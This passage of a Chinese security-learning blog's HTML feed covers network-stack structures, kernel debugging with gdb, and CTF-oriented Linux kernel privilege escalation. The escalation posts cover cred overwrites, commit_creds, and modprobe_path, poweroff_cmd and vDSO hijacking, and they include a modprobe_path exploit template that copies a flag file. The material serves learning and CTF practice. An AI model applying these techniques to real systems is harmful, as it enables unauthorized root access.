class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifaddr</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifaddr</span> *<span class="hljs-title">ifa_next</span>;</span><span class="hljs-comment">/* next address for interface */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifnet</span> *<span class="hljs-title">ifa_ifp</span>;</span><span class="hljs-comment">/* back-pointer to interface */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">ifa_addr</span> ;</span> <span class="hljs-comment">/* address of interface */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> *<span class="hljs-title">ifa_dstaddr</span> ;</span><span class="hljs-comment">/* other end of p-to-p link */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> ifa_broadaddr ifa_dstaddr<span class="hljs-comment">/* broadcast address interface */</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span>* <span class="hljs-title">ifa_netmask</span>;</span><span class="hljs-comment">/* used to determine subnet */</span><br>    <span class="hljs-type">void</span> (*ifa_rtrequest) ();<span class="hljs-comment">/* check or clean routes */</span><br>    u_short ifa_f1ags;<span class="hljs-comment">/*mostly rt_ flags for cloning */</span><br>    <span class="hljs-type">short</span> ifa_refcnt;<span class="hljs-comment">/* references to this structure */</span><br>    <span class="hljs-type">int</span> ifa_metric;<span class="hljs-comment">/* cost for this interface */</span><br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>感觉这两个结构只要搞懂图就差不多了吧😭</p></blockquote><h3 id="sockaddr"><a href="#sockaddr" class="headerlink" title="sockaddr"></a>sockaddr</h3><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424221919519.png" alt="image-20230424221919519"></p><blockquote><p>看看图差不多得了，这b课真该死啊😅</p></blockquote><h3 id="if-attach"><a href="#if-attach" class="headerlink" title="if_attach"></a>if_attach</h3><blockquote><p>用来完成ifnet结构的初始化和搭建，第三章是真逆天，差不多得了</p></blockquote><p><img src="/img/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%A4%8D%E4%B9%A0.assets/image-20230424222838348.png" alt="image-20230424222838348"></p><p><code>if_attach</code>被调用了三次: 以一个<code>le_softc</code>结构为参数从<code>leattach</code>调用，以一个<code>sl_softc</code>结构为数从<code>slattach</code>调用，以一个通用<code>ifnet</code>结构为参数从<code>loopattach</code>调用。每次调用时，它向ifnet列表中添加一个的<code>ifnet</code>结构，为这个接口创建一个链路层<code>ifaddr</code>结构(包含两个<code>sockaddr_dl</code>结构)，并且初始化<code>ifnet_addrs</code>数组中的一项。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【kernel】内核本地调试入门</title>
    <link href="/2023/03/31/%E3%80%90Linux%20kernel%E5%85%A5%E9%97%A8%E3%80%91%E5%86%85%E6%A0%B8%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/"/>
    <url>/2023/03/31/%E3%80%90Linux%20kernel%E5%85%A5%E9%97%A8%E3%80%91%E5%86%85%E6%A0%B8%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="提取vmlinux"><a href="#提取vmlinux" class="headerlink" title="提取vmlinux"></a>提取vmlinux</h2><p>使用extract-vmlinux脚本提取，脚本下载地址：<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">linux&#x2F;extract-vmlinux at master · torvalds&#x2F;linux (github.com)</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></td></tr></table></figure><h3 id="开放调试端口"><a href="#开放调试端口" class="headerlink" title="开放调试端口"></a>开放调试端口</h3><p>在<code>boot.sh</code>中加入如下参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">-gdb tcp::[port]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">如下</span><br>-gdb tcp::1234<br></code></pre></td></tr></table></figure><p>启动<code>boot.sh</code></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><ul><li>root权限下运行</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb ./vmlinux -q<br></code></pre></td></tr></table></figure><ul><li>导入符号表</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">add-symbol-file ./fs/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000<br><span class="hljs-meta prompt_">#</span><span class="language-bash">第一个参数为符号表地址 第二个参数为kernel基址</span> <br><span class="hljs-meta prompt_">#</span><span class="language-bash">在开启kaslr时，kernel基址不固定，可在qemu的-append参数中增添‘kaslr’</span><br></code></pre></td></tr></table></figure><p>地址可以在文件系统中使用<code>cat /proc/modules</code>查看</p><ul><li>连接端口</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">target remote 127.0.0.1:1234<br></code></pre></td></tr></table></figure><p>然后在其中下好断点便可以开始调试</p><p><img src="/img/article/kernelgdb/image-20230331205128408.png" alt="image-20230331205128408"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【kernel】提权入门-part2</title>
    <link href="/2023/03/29/%E3%80%90kernel%E3%80%91%E6%8F%90%E6%9D%83%E5%85%A5%E9%97%A8-part2/"/>
    <url>/2023/03/29/%E3%80%90kernel%E3%80%91%E6%8F%90%E6%9D%83%E5%85%A5%E9%97%A8-part2/</url>
    
    <content type="html"><![CDATA[<p>如果我们可以改变特权进程的执行轨迹，也可以实现提权。这里我们从以下角度来考虑如何改变特权进程的执行轨迹。</p><ul><li>改数据</li><li>改代码</li></ul><h2 id="改数据"><a href="#改数据" class="headerlink" title="改数据"></a>改数据</h2><h3 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a>符号链接</h3><p>如果一个 root 权限的进程会执行一个符号链接的程序，并且该符号链接或者符号链接指向的程序可以由攻击者控制，攻击者就可以实现提权。</p><h3 id="call-usermodehelper"><a href="#call-usermodehelper" class="headerlink" title="call_usermodehelper"></a>call_usermodehelper</h3><p><code>call_usermodehelper</code> 是一种内核线程执行用户态应用的方式，并且启动的进程具有 root 权限。因此，如果我们能够控制具体要执行的应用，那就可以实现提权。在内核中，<code>call_usermodehelper</code> 具体要执行的应用往往是由某个变量指定的，因此我们只需要想办法修改掉这个变量即可。不难看出，这是一种典型的数据流攻击方法。一般常用的主要有以下几种方式。</p><h4 id="修改-modprobe-path"><a href="#修改-modprobe-path" class="headerlink" title="修改 modprobe_path"></a>修改 modprobe_path</h4><p>修改 <code>modprobe_path</code> 实现提权的基本流程如下</p><ol><li><p>获取 <code>modprobe_path</code> 的地址。</p></li><li><p>修改 <code>modprobe_path</code> 为指定的程序。</p></li><li><p>触发执行<code>call_modprobe</code>，从而实现提权 。这里我们可以利用以下几种方式来触发</p><ol><li>执行一个非法的可执行文件。非法的可执行文件需要满足相应的要求（参考<code>call_usermodehelper</code> 部分的介绍）。</li></ol></li><li><p>使用未知协议来触发。</p></li></ol><p>这里我们也给出使用 <code>modprobe_path</code> 的模板。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// step 1. modify modprobe_path to the target value</span><br><br><span class="hljs-comment">// step 2. create related file</span><br>system(<span class="hljs-string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag&#x27; &gt; /home/pwn/catflag.sh&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /home/pwn/catflag.sh&quot;</span>);<br><br><span class="hljs-comment">// step 3. trigger it using unknown executable</span><br>system(<span class="hljs-string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /home/pwn/dummy&quot;</span>);<br>system(<span class="hljs-string">&quot;/home/pwn/dummy&quot;</span>);<br><br><span class="hljs-comment">// step 3. trigger it using unknown protocol</span><br>socket(AF_INET,SOCK_STREAM,<span class="hljs-number">132</span>);<br></code></pre></td></tr></table></figure><p>在这个过程中，我们着重关注下如何定位 <code>modprobe_path</code>。</p><h5 id="直接定位"><a href="#直接定位" class="headerlink" title="直接定位"></a>直接定位</h5><p>由于 <code>modprobe_path</code> 的取值是确定的，所以我们可以直接扫描内存，寻找对应的字符串。这需要我们具有扫描内存的能力。</p><h5 id="间接定位"><a href="#间接定位" class="headerlink" title="间接定位"></a>间接定位</h5><p>考虑到 <code>modprobe_path</code> 相对于内核基地址的偏移是固定的，我们可以先获取到内核的基地址，然后根据相对偏移来得到 <code>modprobe_path</code> 的地址。</p><h4 id="修改-poweroff-cmd"><a href="#修改-poweroff-cmd" class="headerlink" title="修改 poweroff_cmd"></a>修改 poweroff_cmd</h4><ol><li>修改 <code>poweroff_cmd</code> 为指定的程序。</li><li>劫持控制流执行 <code>__orderly_poweroff</code>。</li></ol><p>关于如何定位 <code>poweroff_cmd</code>，我们可以采用类似于定位 <code>modprobe_path</code> 的方法。</p><h2 id="改代码"><a href="#改代码" class="headerlink" title="改代码"></a>改代码</h2><p>在程序运行时，如果我们可以修改 root 权限进程执行的代码，那其实我们也可以实现提权。</p><h3 id="修改-vDSO-代码"><a href="#修改-vDSO-代码" class="headerlink" title="修改 vDSO 代码"></a>修改 vDSO 代码</h3><p>内核中 vDSO 的代码会被映射到所有的用户态进程中。如果有一个高特权的进程会周期性地调用 vDSO 中的函数，那我们可以考虑把 vDSO 中相应的函数修改为特定的 shellcode。当高权限的进程执行相应的代码时，我们就可以进行提权。</p><p>在早期的时候，Linux 中的 vDSO 是可写的，考虑到这样的风险，Kees Cook 提出引入 <code>post-init read-only</code> 的数据，即将那些初始化后不再被写的数据标记为只读，来防御这样的利用。</p><p>在引入之前，vDSO 对应的 raw_data 只是标记了对齐属性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;/* AUTOMATICALLY GENERATED -- DO NOT EDIT */\n\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;#include &lt;linux/linkage.h&gt;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;#include &lt;asm/page_types.h&gt;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;#include &lt;asm/vdso.h&gt;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile,<br>    <span class="hljs-string">&quot;static unsigned char raw_data[%lu] __page_aligned_data = &#123;&quot;</span>,<br>    mapping_size);<br></code></pre></td></tr></table></figure><p>引入之后，vDSO 对应的 raw_data 则被标记为了初始化后只读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;/* AUTOMATICALLY GENERATED -- DO NOT EDIT */\n\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;#include &lt;linux/linkage.h&gt;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;#include &lt;asm/page_types.h&gt;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;#include &lt;asm/vdso.h&gt;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile, <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(outfile,<br>    <span class="hljs-string">&quot;static unsigned char raw_data[%lu] __ro_after_init __aligned(PAGE_SIZE) = &#123;&quot;</span>,<br>    mapping_size);<br></code></pre></td></tr></table></figure><p>通过修改 vDSO 进行提权的基本方式如下</p><ul><li>定位 vDSO</li><li>修改 vDSO 的特定函数为指定的 shellcode</li><li>等待触发执行 shellcode</li></ul><p>这里我们着重关注下如何定位 vDSO。</p><h4 id="IDA-里定位"><a href="#IDA-里定位" class="headerlink" title="IDA 里定位"></a>IDA 里定位</h4><p>这里我们介绍一下如何在 vmlinux 中找到 vDSO 的位置。</p><ol><li>在 IDA 里定位 <code>init_vdso</code> 函数的地址</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C">__int64 <span class="hljs-title function_">init_vdso</span><span class="hljs-params">()</span><br>&#123;<br>  init_vdso_image(&amp;vdso_image_64 + <span class="hljs-number">0x20000000</span>);<br>  init_vdso_image(&amp;vdso_image_x32 + <span class="hljs-number">0x20000000</span>);<br>  cpu_maps_update_begin();<br>  on_each_cpu((<span class="hljs-type">char</span> *)startup_64 + <span class="hljs-number">0x100003EA0</span>LL, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>);<br>  _register_cpu_notifier(&amp;sdata + <span class="hljs-number">536882764</span>);<br>  cpu_maps_update_done();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>可以看到 <code>vdso_image_64</code> 和 <code>vdso_image_x32</code>。以<code>vdso_image_64</code> 为例，点到该变量的地址</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.rodata:FFFFFFFF81A01300                 public vdso_image_64<br>.rodata:FFFFFFFF81A01300 vdso_image_64   dq offset raw_data      ; DATA XREF: arch_setup_additional_pages+18↑o<br>.rodata:FFFFFFFF81A01300                                         ; init_vdso+1↓o<br></code></pre></td></tr></table></figure><ol><li>点击 <code>raw_data</code> 即可知道 64 位 vDSO 在内核镜像中的地址，可以看到，vDSO 确实是以页对齐的。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.data:FFFFFFFF81E04000 raw_data        db  7Fh ;              ; DATA XREF: .rodata:vdso_image_64↑o<br>.data:FFFFFFFF81E04001                 db  45h ; E<br>.data:FFFFFFFF81E04002                 db  4Ch ; L<br>.data:FFFFFFFF81E04003                 db  46h ; F<br></code></pre></td></tr></table></figure><p>从最后的符号来看，我们也可以直接使用 <code>raw_data</code> 来寻找 vDSO。</p><h4 id="内存中定位"><a href="#内存中定位" class="headerlink" title="内存中定位"></a>内存中定位</h4><h5 id="直接定位-1"><a href="#直接定位-1" class="headerlink" title="直接定位"></a>直接定位</h5><p>vDSO 其实是一个 ELF 文件，具有 ELF 文件头。同时，vDSO 中特定位置存储着导出函数的字符串。因此我们可以根据这两个特征来扫描内存，定位 vDSO 的位置。</p><h5 id="间接定位-1"><a href="#间接定位-1" class="headerlink" title="间接定位"></a>间接定位</h5><p>考虑到 vDSO 相对于内核基地址的偏移是固定的，我们可以先获取到内核的基地址，然后根据相对偏移来得到 vDSO 的地址。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【kernel】提权入门-part1</title>
    <link href="/2023/03/29/%E3%80%90kernel%E3%80%91%E6%8F%90%E6%9D%83%E5%85%A5%E9%97%A8-part1/"/>
    <url>/2023/03/29/%E3%80%90kernel%E3%80%91%E6%8F%90%E6%9D%83%E5%85%A5%E9%97%A8-part1/</url>
    
    <content type="html"><![CDATA[<blockquote><p>纠结了很久，决定还是开启这个模块的学习，在这个路口迷茫了很久了，一直没有决定好走向何处。虽然有可能会走错路，可能会学习很多看起来没用的东西，但希望Kernel的学习能够带我刚开始接触PWN时的乐趣。将会主要借助CTF wiki和《从0到1》</p></blockquote><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>内核会通过进程的 <code>task_struct</code> 结构体中的 <code>cred</code> 指针来索引 <code>cred</code> 结构体，然后根据 <code>cred</code> 的内容来判断一个进程拥有的权限，如果 <code>cred</code> 结构体成员中的 <strong>uid-fsgid</strong> 都为 0，那一般就会认为进程具有 <strong>root</strong> 权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-type">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>    <span class="hljs-type">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br>    <span class="hljs-type">void</span>        *put_addr;<br>    <span class="hljs-type">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC  0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">kuid_t</span>      uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      suid;       <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      sgid;       <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      euid;       <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      egid;       <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      fsuid;      <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-type">kgid_t</span>      fsgid;      <span class="hljs-comment">/* GID for VFS ops */</span><br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>因此，很自然就能想到两种思路来进行提权：</p><ul><li>直接修改 <code>cred</code> 结构体的内容</li><li>修改 <code>task_struct</code> 结构体中的 cred 指针指向一个满足要求的 cred</li></ul><h2 id="直接定位"><a href="#直接定位" class="headerlink" title="直接定位"></a>直接定位</h2><p>cred 结构体的最前面记录了各种 id 信息，对于一个普通的进程而言，<code>uid-fsgid</code> 都是执行进程的用户的身份。因此我们可以通过扫描内存来定位 cred。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-type">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>    <span class="hljs-type">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br>    <span class="hljs-type">void</span>        *put_addr;<br>    <span class="hljs-type">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC  0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">kuid_t</span>      uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      suid;       <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      sgid;       <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      euid;       <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>      egid;       <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>      fsuid;      <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-type">kgid_t</span>      fsgid;      <span class="hljs-comment">/* GID for VFS ops */</span><br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>在实际定位的过程中，我们可能会发现很多满足要求的 cred，这主要是因为 cred 结构体可能会被拷贝、释放。</strong>一个很直观的想法是在定位的过程中，利用 usage 不为 0 来筛除掉一些 cred，但仍然会发现一些 usage 为 0 的 cred。这是因为 cred 从 usage 为 0， 到释放有一定的时间。此外，cred 是使用 rcu 延迟释放的。</p><h2 id="间接定位"><a href="#间接定位" class="headerlink" title="间接定位"></a>间接定位</h2><h3 id="task-struct"><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h3><p>进程的 <code>task_struct</code> 结构体中会存放指向 cred 的指针，因此我们可以</p><ol><li>定位当前进程 <code>task_struct</code> 结构体的地址</li><li>根据 cred 指针相对于 task_struct 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li><li>获取 <code>cred</code> 具体的地址</li></ol><h3 id="comm"><a href="#comm" class="headerlink" title="comm"></a>comm</h3><p>comm 用来标记可执行文件的名字，位于进程的 <code>task_struct</code> 结构体中。我们可以发现 comm 其实在 cred 的正下方，所以我们也可以先定位 comm ，然后定位 cred 的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* Process credentials: */</span><br><br>    <span class="hljs-comment">/* Tracer&#x27;s credentials at attach: */</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>     *<span class="hljs-title">ptracer_cred</span>;</span><br><br>    <span class="hljs-comment">/* Objective and real subjective task credentials (COW): */</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>     *<span class="hljs-title">real_cred</span>;</span><br><br>    <span class="hljs-comment">/* Effective (overridable) subjective task credentials (COW): */</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>     *<span class="hljs-title">cred</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br>    <span class="hljs-comment">/* Cached requested key. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>          *<span class="hljs-title">cached_requested_key</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * executable name, excluding path.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * - normally initialized setup_new_exec()</span><br><span class="hljs-comment">     * - access it with [gs]et_task_comm()</span><br><span class="hljs-comment">     * - lock it with task_lock()</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">char</span>                comm[TASK_COMM_LEN];<br></code></pre></td></tr></table></figure><p>然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，我们可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。</p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><p>在这种方法下，我们可以直接将 cred 中的 <code>uid-fsgid</code> 都修改为 0。当然修改的方式有很多种，比如说</p><ul><li>在我们具有任意地址读写后，可以直接修改 cred。</li><li>在我们可以 ROP 执行代码后，可以利用 ROP gadget 修改 cred。</li></ul><h3 id="利用UAF修改"><a href="#利用UAF修改" class="headerlink" title="利用UAF修改"></a>利用UAF修改</h3><p>如果我们在进程初始化时能控制 cred 结构体的位置，并且我们可以在初始化后修改该部分的内容，那么我们就可以很容易地达到提权的目的。这里给出一个典型的例子</p><ol><li>申请一块与 cred 结构体大小一样的堆块</li><li>释放该堆块</li><li>fork 出新进程，恰好使用刚刚释放的堆块</li><li>此时，修改 cred 结构体特定内存，从而提权</li></ol><p>非常有意思的是，在这个过程中，我们不需要任何的信息泄露。</p><h3 id="利用commit-creds修改"><a href="#利用commit-creds修改" class="headerlink" title="利用commit_creds修改"></a>利用commit_creds修改</h3><p>我们还可以使用 <code>commit_creds(prepare_kernel_cred(0))</code> 来进行提权，该方式会自动生成一个合法的 cred，并定位当前线程的 <code>task_struct</code> 的位置，然后修改它的 cred 为新的 cred。该方式比较适用于控制程序执行流后使用。</p><p><img src="/img/article/%E6%8F%90%E6%9D%83%E5%85%A5%E9%97%A8/elevation-of-privilege.png" alt="72b919b7-87bb-4312-97ea-b59fe4690b2e"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux Syscall Reference(64 bit)</title>
    <link href="/2023/03/29/Linux%20Syscall%20Reference(64%20bit)/"/>
    <url>/2023/03/29/Linux%20Syscall%20Reference(64%20bit)/</url>
    
    <content type="html"><![CDATA[<blockquote><p>列举了全部的64位syscall调用表，方便离线时进行查询</p></blockquote><table><thead><tr><th>#</th><th>Name</th><th>Registers</th><th>Definition</th><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>rax</td><td>rdi</td><td>rsi</td><td>rdx</td><td>r10</td><td>r8</td><td>r9</td><td></td><td></td><td></td></tr><tr><td>0</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html">sys_read</a></td><td>0x00</td><td>unsigned int fd</td><td>char __user *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L621">fs&#x2F;read_write.c:621</a></td></tr><tr><td>1</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/write.2.html">sys_write</a></td><td>0x01</td><td>unsigned int fd</td><td>const char __user *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L646">fs&#x2F;read_write.c:646</a></td></tr><tr><td>2</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/open.2.html">sys_open</a></td><td>0x02</td><td>const char __user *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fhandle.c#L256">fs&#x2F;fhandle.c:256</a></td></tr><tr><td>3</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/close.2.html">sys_close</a></td><td>0x03</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L1437">fs&#x2F;open.c:1437</a></td></tr><tr><td>4</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newstat.2.html">sys_newstat</a></td><td>0x04</td><td>const char 